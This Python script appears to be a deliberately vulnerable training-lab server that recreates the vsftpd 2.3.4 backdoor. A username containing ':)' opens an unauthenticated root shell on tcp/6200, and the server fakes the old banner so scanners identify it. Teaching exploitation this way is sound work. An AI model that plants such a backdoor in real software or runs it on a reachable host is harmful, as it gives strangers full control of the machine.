#!/usr/bin/env python3
# VULNERABLE BY DESIGN - training lab only. Never expose to an untrusted network.
#
# Reproduces the historical vsftpd 2.3.4 backdoor for teaching:
#   a USER whose name contains ":)" opens an UNAUTHENTICATED ROOT shell on tcp/6200.
# This is exactly what `exploit/unix/ftp/vsftpd_234_backdoor` triggers.
# Normal anonymous FTP (read-only recon of /srv/ftp) works the rest of the time,
# and the banner advertises "(vsFTPd 2.3.4)" so version fingerprinting lands on
# the right CVE path.
import os
import socket
import subprocess
import threading

from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

BACKDOOR_PORT = 6200
_lock = threading.Lock()
_backdoor_open = False


def open_backdoor():
    """Bind a root shell on tcp/6200 (once). The container runs as root, so the
    spawned /bin/sh is root — matching the real backdoor."""
    global _backdoor_open
    with _lock:
        if _backdoor_open:
            return
        _backdoor_open = True

    def serve():
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", BACKDOOR_PORT))
        srv.listen(5)
        while True:
            conn, _ = srv.accept()
            fd = conn.fileno()
            # wire the shell straight to the socket; keep serving for a whole class
            subprocess.Popen(["/bin/sh"], stdin=fd, stdout=fd, stderr=fd,
                             close_fds=False)

    threading.Thread(target=serve, daemon=True).start()


class BackdoorHandler(FTPHandler):
    def ftp_USER(self, line):
        # the backdoor trigger: a smiley in the username
        if ":)" in line:
            open_backdoor()
        super().ftp_USER(line)


def main():
    authorizer = DummyAuthorizer()
    authorizer.add_anonymous("/srv/ftp", perm="elr")  # list + download, read-only

    BackdoorHandler.authorizer = authorizer
    BackdoorHandler.banner = "(vsFTPd 2.3.4)"
    # Passive data connections are advertised on this address. On Linux the
    # launcher sets PASV_ADDRESS to the container IP; default is 127.0.0.1.
    BackdoorHandler.masquerade_address = os.environ.get("PASV_ADDRESS", "127.0.0.1")
    BackdoorHandler.passive_ports = range(21000, 21011)

    server = FTPServer(("0.0.0.0", 21), BackdoorHandler)
    server.serve_forever()


if __name__ == "__main__":
    main()
